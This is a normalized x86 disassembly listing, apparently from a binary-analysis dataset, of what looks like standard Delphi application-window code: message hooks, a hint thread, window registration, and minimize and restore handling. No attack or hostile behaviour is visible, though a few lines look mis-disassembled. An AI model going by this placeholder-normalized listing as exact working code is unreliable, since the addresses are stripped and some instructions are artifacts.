jmp r-xdata
sub_4589a4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx rw-data
call GetCurrentThreadId
mov [ rw-data ] eax
jmp r-xdata
push 0x64
mov eax [ rw-data ]
push eax
call WaitForSingleObject
cmp eax 0x102
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call GetCursorPos
lea eax [ ebp - 0x8 ]
call sub_438bc4
test eax eax
jne r-xdata
mov eax [ ebx ]
call sub_45ae18
sub_458a00
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
push esi
mov eax [ ebp + 0xc ]
push eax
push ebx
mov eax [ rw-data ]
push eax
call CallNextHookEx
mov edi eax
test ebx ebx
jl r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ rw-data ] 0x0
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_459eb8
sub_458a44
push ecx
mov eax [ rw-data ]
cmp [ eax + 0xa5 ] 0x0
jne r-xdata
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
call GetCurrentThreadId
push eax
push 0x0
mov eax sub_458a00
push eax
push 0x3
call SetWindowsHookExA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ rw-data ] eax
push esp
push 0x0
push 0x0
push sub_4589a4
push 0x3e8
push 0x0
call CreateThread
mov [ rw-data ] eax
sub_458ab8
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call UnhookWindowsHookEx
retn
mov eax [ rw-data ]
push eax
call SetEvent
call GetCurrentThreadId
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
push eax
call CloseHandle
xor eax eax
mov [ rw-data ] eax
push 0xffffffff
mov eax [ rw-data ]
push eax
call WaitForSingleObject
sub_458b14
add esp 0xfffffff8
mov [ esp ] 0x8
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x48
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
pop ecx
pop edx
retn
cmp [ esp + 0x4 ] 0x0
setne al
pop ecx
pop edx
retn
sub_458b44
add esp 0xfffffff8
mov [ esp ] 0x8
cmp al 0x1
cmc
sbb eax eax
mov [ esp + 0x4 ] eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x49
call SystemParametersInfoA
pop ecx
pop edx
retn
sub_458b6c
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_458b14
mov ebx eax
test bl bl
je r-xdata
push edi
push esi
call ShowWindow
test bl bl
je r-xdata
xor eax eax
call sub_458b44
pop edi
pop esi
pop ebx
retn
mov al 0x1
call sub_458b44
sub_458bac
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_419854
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_403428
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_45a284
mov [ ebx + 0x34 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ ebx + 0x90 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ ebx + 0xa8 ] eax
xor eax eax
mov [ ebx + 0x60 ] eax
xor eax eax
mov [ ebx + 0x84 ] eax
mov [ ebx + 0x5c ] 0xff000018
mov [ ebx + 0x78 ] 0x1f4
mov [ ebx + 0x7c ] 0x1
xor eax eax
mov [ ebx + 0x80 ] eax
mov [ ebx + 0x74 ] 0x9c4
mov [ ebx + 0x88 ] 0x0
mov [ ebx + 0x9d ] 0x1
mov [ ebx + 0xb4 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_4235fc
mov esi eax
mov [ ebx + 0x98 ] esi
push r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call LoadIconA
mov edx eax
mov eax esi
call sub_4239cc
mov eax [ ebx + 0x98 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_45aa1c
push 0x100
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetModuleFileNameA
lea eax [ ebp - 0x101 ]
push eax
lea eax [ ebp - 0x101 ]
push eax
call OemToCharA
lea eax [ ebp - 0x101 ]
mov dl 0x5c
call sub_40c3a0
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_45a47c
lea eax [ ebp - 0x101 ]
mov dl 0x2e
call sub_40c3c8
test eax eax
je r-xdata
lea edx [ eax + 0x1 ]
lea eax [ ebp - 0x101 ]
call sub_408540
lea eax [ ebp - 0x101 ]
inc eax
push eax
call CharLowerA
lea eax [ ebx + 0x8c ]
lea edx [ ebp - 0x101 ]
mov ecx 0x100
call sub_4040c4
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ eax ] 0x0
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x5b ] 0x1
mov [ ebx + 0x9e ] 0x1
xor eax eax
mov [ ebx + 0xa0 ] eax
mov eax ebx
call sub_45abf8
mov eax ebx
call sub_45b5bc
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
call sub_458eb4
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_458d95
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff0
call sub_403490
mov ebx edx
mov esi eax
mov eax esi
call sub_45b5cc
mov [ esp + 0x4 ] esi
mov [ esp ] sub_45a284
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp ]
jne r-xdata
mov [ esp + 0xc ] esi
mov [ esp + 0x8 ] sub_45a47c
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ esi + 0xa0 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ esi + 0x9d ] 0x0
mov eax esi
call sub_45ae18
xor edx edx
mov eax esi
call sub_45a794
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4198a0
push esi
push sub_4592e8
mov eax esi
call sub_45a070
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
push eax
call FreeLibrary
cmp [ esi + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0xa4 ] 0x0
je r-xdata
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
lea eax [ esi + 0x4c ]
call sub_4054f4
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
mov eax [ esi + 0xa8 ]
call sub_403104
mov eax [ esi + 0x90 ]
call sub_403104
mov eax [ esi + 0x98 ]
call sub_403104
test bl bl
jle r-xdata
call sub_41a97c
mov eax [ esi + 0x30 ]
push eax
call DestroyWindow
push 0x0
push 0x1
push 0x80
push eax
call SendMessageA
add esp 0x10
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_458eb4
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor edx edx
mov [ ebp - 0x2c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_459055
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45905c
lea eax [ ebp - 0x2c ]
call sub_403e54
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
push ebx
push sub_459434
call sub_41a8e4
mov [ ebx + 0x40 ] eax
mov eax DefWindowProcA
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
push rw-data
call RegisterClassA
test ax ax
jne r-xdata
push eax
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
lea edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b520
call sub_403890
push eax
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov eax [ ebx + 0x8c ]
call sub_404314
mov edx eax
mov ecx 0x84ca0000
mov eax [ rw-data ]
call sub_4068c0
mov [ ebx + 0x30 ] eax
lea eax [ ebx + 0x8c ]
call sub_403e54
mov [ ebx + 0xa4 ] 0x1
mov eax [ ebx + 0x40 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x30 ]
push eax
call SetWindowLongA
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetSystemMenu
mov ebx eax
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_459b38
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_459b38
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
push 0x0
push 0xf010
push ebx
call DeleteMenu
sub_459064
push ebx
push esi
mov ecx rw-data
cmp edx [ eax + 0x44 ]
jne r-xdata
cmp edx [ eax + 0x48 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x44 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x64 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x48 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x68 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x64 ] esi
mov ebx [ ecx ]
cmp edx [ ebx + 0x78 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x68 ] esi
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x6c ] esi
cmp edx [ eax + 0x60 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x78 ] esi
mov eax [ ecx ]
call sub_457d98
pop esi
pop ebx
retn
xor edx edx
mov [ eax + 0x60 ] edx
sub_4590c4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
or esi 0xffffffff
push 0x4
push ebx
call GetWindow
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] ebx
xor esi esi
mov eax [ rw-data ]
mov edi [ eax + 0x44 ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x90 ]
mov edx ebx
call sub_413c10
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax edi
call sub_440b28
cmp ebx eax
je r-xdata
sub_459134
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
inc [ ebx + 0x94 ]
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
mov [ esp + 0x4 ] dl
mov eax esp
push eax
push sub_4590c4
call EnumWindows
mov eax [ ebx + 0x90 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x3
mov eax [ esp + 0x4 ]
push eax
call GetWindow
mov esi eax
mov [ esp ] esi
push 0xffffffec
push esi
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov [ esp ] 0xfffffffe
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ esp + 0x14 ]
push eax
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_413d6c
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_45924c
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jle r-xdata
dec [ ebx + 0x94 ]
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ ebx + 0x90 ]
mov edx [ eax ]
call [ edx + 0x8 ]
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_413d6c
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_4592e8
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
cmp eax [ rw-data ]
je r-xdata
cmp [ esi + 0x59 ] 0x0
je r-xdata
cmp eax 0x1a
jne r-xdata
cmp [ esi + 0x5a ] 0x0
je r-xdata
push 0x400
call SetThreadLocale
call sub_40c668
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
call sub_4582a4
mov eax [ rw-data ]
call sub_4588ec
sub_459340
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45939d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x13a ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4593a4
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x8 ]
call sub_40404c
mov eax [ ebp - 0x4 ]
push eax
lea eax [ esi + 0xc ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
sub_4593ac
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call DefWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_4593e8
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call BeginPaint
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_459b38
push eax
push 0x0
push 0x0
push ebx
call DrawIcon
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call EndPaint
pop ebx
mov esp ebp
pop ebp
retn
sub_459434
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_459aee
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4592e8
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx ]
mov eax ebx
cmp eax 0x53
jg r-xdata
inc ebx
xor esi esi
cmp eax 0xb017
jg r-xdata
je r-xdata
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0xb020
jg r-xdata
je r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov edx [ ebp - 0x8 ]
mov dx [ edx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_45a554
jmp r-xdata
cmp eax 0x16
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov edx esi
call sub_413d6c
mov edi eax
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x4 ]
call [ edi ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub eax 0xb031
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
cmp eax 0xb000
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0x1d
jg r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
add eax 0xfffffff2
sub eax 0x2
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
sub eax 0xb01a
je r-xdata
mov esi eax
mov eax esi
call sub_440b28
test eax eax
je r-xdata
sub eax 0xb001
je r-xdata
je r-xdata
sub eax 0x37
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xb0 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb0 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_45b480
and eax 0x7f
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_45a070
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_45a014
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
sub eax 0x5
je r-xdata
mov eax esi
call sub_440b28
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10a ] 0x0
je r-xdata
sub eax 0x15
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x112 ] 0x0
je r-xdata
sub eax 0x112
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_459b38
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x13
je r-xdata
mov eax [ rw-data ]
call sub_4588ec
push ebp
call sub_4593ac
pop ecx
jmp r-xdata
sub eax 0x1a
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x9c ] 0x1
jmp r-xdata
push ebp
call sub_4593ac
pop ecx
jmp [ eax * 4 + jump_table_4594d8 ]
call GetFocus
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x30 ]
jne r-xdata
jmp r-xdata
mov eax esi
call sub_440b28
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_459eec
test al al
je r-xdata
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
sub eax 0xf020
je r-xdata
add eax 0xffffffe0
sub eax 0x7
jb r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax ] 0xde534454
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_445430
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_459340
push ebp
call sub_4593ac
pop ecx
jmp r-xdata
sub eax 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x27
push ebp
call sub_4593ac
pop ecx
jmp r-xdata
push 0x0
push 0x0
push 0xb01a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
push ebp
call sub_4593ac
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
xor eax eax
call sub_4196b4
jmp r-xdata
xor eax eax
call sub_45126c
test eax eax
je r-xdata
mov [ rw-data ] 0x0
call GetFocus
mov ebx eax
mov eax esi
call sub_440b28
push eax
call SetFocus
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax esi
call sub_43b4f4
push ebx
call SetFocus
mov [ rw-data ] 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_459b54
jmp r-xdata
sub eax 0x100
je r-xdata
mov esi [ ebp - 0x8 ]
mov esi [ esi + 0x8 ]
push esi
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
add ebx 0xbc00
push ebx
mov eax [ ebp - 0x8 ]
push esi
call SendMessageA
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x1e1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9e ] 0x0
je r-xdata
push ebp
call sub_4593ac
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
sbb eax eax
inc eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x9d ] al
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
jmp r-xdata
call sub_456aec
jmp r-xdata
push ebp
call sub_4593ac
pop ecx
jmp r-xdata
push ebp
call sub_4593e8
pop ecx
jmp r-xdata
push ebp
call sub_4593ac
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xac ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_45924c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
test eax eax
je r-xdata
push eax
call SetFocus
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_459c04
jmp r-xdata
jmp r-xdata
call sub_42f358
call sub_42f438
test al al
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_45923c
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45924c
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_459244
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_45111c
mov edx [ ebp - 0x4 ]
mov [ edx + 0xac ] eax
push ebp
call sub_4593ac
pop ecx
jmp r-xdata
call sub_4511d0
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xac ] edx
push ebp
call sub_4593ac
pop ecx
jmp r-xdata
call sub_42f358
call sub_42f494
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx 0x8000
mov eax r-xdata
call sub_40d144
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
call GetLastError
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
push eax
call GetProcAddress
mov esi eax
mov ebx esi
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
push edx
mov edx [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call ebx
jmp r-xdata
sub_459b54
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_45923c
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x6
mov eax [ ebx + 0x30 ]
call sub_458b6c
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
mov eax [ ebx + 0x44 ]
call sub_440b28
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push 0x40
push 0x0
mov esi [ ebx + 0x44 ]
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x44 ]
push eax
mov eax [ esi + 0x40 ]
push eax
mov eax [ ebx + 0x44 ]
call sub_440b28
push eax
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
push 0x0
push 0xf020
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
cmp [ ebx + 0x11a ] 0x0
je r-xdata
sub_459c04
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x9
mov eax [ ebx + 0x30 ]
call sub_458b6c
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
mov eax [ ebx + 0x44 ]
call sub_440b28
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
adc eax 0x0
push 0x0
push 0xf120
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
mov eax ebx
call sub_45924c
mov eax [ rw-data ]
mov esi [ eax + 0x64 ]
test esi esi
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
push 0x40
push 0x0
push 0x0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
mov eax esi
call sub_440b28
push eax
call SetFocus
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
xor edx edx
call sub_454878
mov eax [ ebx + 0x44 ]
call sub_456c94
sub_459d04
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call GetLastActivePopup
mov esi eax
test esi esi
je r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
push esi
call IsWindowVisible
test eax eax
je r-xdata
push esi
call IsWindowEnabled
test eax eax
je r-xdata
